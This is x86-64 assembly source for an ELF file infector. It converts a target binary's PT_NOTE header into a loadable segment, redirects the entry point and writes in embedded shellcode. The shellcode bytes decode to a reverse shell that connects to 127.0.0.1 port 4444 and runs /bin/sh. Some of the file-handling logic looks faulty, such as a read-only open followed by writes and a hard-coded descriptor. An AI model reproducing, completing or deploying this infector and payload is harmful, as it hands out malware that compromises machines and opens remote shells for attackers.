section .data
    shellcode db 0x48,0x31,0xff,0x6a,0x09,0x58,0x6a,0x01,0x5e,0x48,0x99,0x6a,0x02,0x5f,0x6a,0x29,0x58,0x0f,0x05,0x48,0x97,0x48,0xb9,0x02,0x00,0x11,0x5c,0x7f,0x00,0x00,0x01,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x48,0x31,0xc0,0x48,0x89,0xc7,0x48,0x89,0xc6,0x48,0x31,0xd2,0x6a,0x03,0x5e,0xb0,0x21,0x0f,0x05,0x48,0xff,0xce,0x79,0xf6,0x48,0x31,0xff,0x57,0x57,0x5e,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0xb0,0x3b,0x0f,0x05
    shellcode_size equ $ - shellcode
    filename db 'mamadou', 0
    p_type db 0x01
    p_flags db 0x05
    p_memsz dq 0xCC
    p_filesz dq 0xCC
    p_align dq 0x200000
    p_offset dq 0x3DD8
    e_entry dq 0xc003DD8
    exagerated dq 0xC000000

section .bss
    fd resd 1
    buffer resb 1000
    offset resq 1
    file_size resq 1
    new_p_vaddr resq 1
    e_entry_saved resq 1

section .text
    global _start

_start:
    ; Open file
    mov eax, 2
    lea rdi, [filename]
    xor esi, esi
    syscall
    mov [fd], eax
    cmp eax, -1
    je _erreur

    ; Read file header
    sub rsp, 1000
    mov r15, rsp
    mov eax, 0
    mov edi, [fd]
    lea rsi, [r15]
    mov edx, 1000
    syscall
    mov r14, [r15+0x18]
    mov [e_entry_saved], r14

    ; Move to specific file offsets and read
    mov eax, 0
    mov edi, [fd]
    lea rsi, [r15]
    mov edx, 1000
    syscall

    mov rax, [r15+0x20]
    mov [file_size], rax

    ; Parse program header
_parse_phdr:
    xor rcx, rcx
    xor rdx, rdx
    mov cx, 13
    mov rbx, 64
    mov dx, 56
loop_phdr:
    add rbx, rdx
    dec rcx
    cmp dword [r15 + rbx], 0x4
    je pt_note_found
    cmp rcx, 0
    jg loop_phdr
pt_note_found:
    mov [offset], rbx

    ; Write modifications to program header
    xor rax, rax
    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, p_type
    mov rdx, 1
    syscall

    mov rax, [exagerated]
    add rax, [file_size]
    mov [new_p_vaddr], rax

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    add rsi, 16
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, new_p_vaddr
    mov rdx, 4
    syscall

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    add rsi, 40
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, p_memsz
    mov rdx, 1
    syscall

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    add rsi, 32
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, p_filesz
    mov rdx, 1
    syscall

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    add rsi, 48
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, p_align
    mov rdx, 3
    syscall

    mov rax, 8
    mov rdi, [fd]
    mov rsi, [offset]
    add rsi, 8
    mov rdx, 0
    syscall

    mov rax, 1
    mov rdi, 3
    mov rsi, file_size
    mov rdx, 3
    syscall

    mov rax, 8
    mov rdi, [fd]
    mov rsi, 24
    xor rdx, rdx
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, e_entry
    mov rdx, 8
    syscall

    ; Write shellcode
    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov rax, 1
    mov rdi, [fd]
    mov rsi, shellcode
    mov rdx, shellcode_size
    syscall

    ; Adjust entry point
    mov rax, 8
    mov rdi, [fd]
    mov rsi, 0
    mov rdx, 1
    syscall

    mov rbx, [e_entry_saved]
    sub rbx, rax
    sub rbx, 5
    mov byte [rsp], 0xE9
    mov [rsp + 1], rbx
    add rsp, 5

    mov rax, 1
    mov rdi, [fd]
    mov rsi, rsp
    sub rsi, 5
    mov rdx, 5
    syscall

    mov eax, 3
    mov edi, [fd]
    syscall

    jmp _exit

_erreur:
    mov eax, 60
    mov edi, 1
    syscall

_exit:
    mov eax, 60
    xor edi, edi
    syscall
